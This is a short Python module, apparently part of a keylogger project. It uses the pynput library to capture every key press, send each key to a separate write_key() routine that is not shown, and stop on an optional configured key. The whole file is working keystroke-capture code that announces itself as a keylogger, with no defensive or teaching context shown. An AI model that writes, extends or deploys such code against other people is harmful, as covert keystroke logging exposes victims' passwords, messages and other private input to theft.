from pynput import keyboard
from src.writer import write_key
from src.config import STOP_KEY

def on_press(key):
    """
    Called every time a key is pressed.
    Logs the key using write_key().
    If STOP_KEY is set, pressing that key will stop the logger.
    """
    write_key(key)

    # Optional stop key
    if STOP_KEY is not None:
        try:
            if key.char == STOP_KEY:
                return False
        except:
            if hasattr(key, "name") and key.name == STOP_KEY:
                return False

def start_logger():
    """
    Starts the keyboard listener. Runs until manually stopped.
    """
    print("[+] Keylogger started. Press CTRL + C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
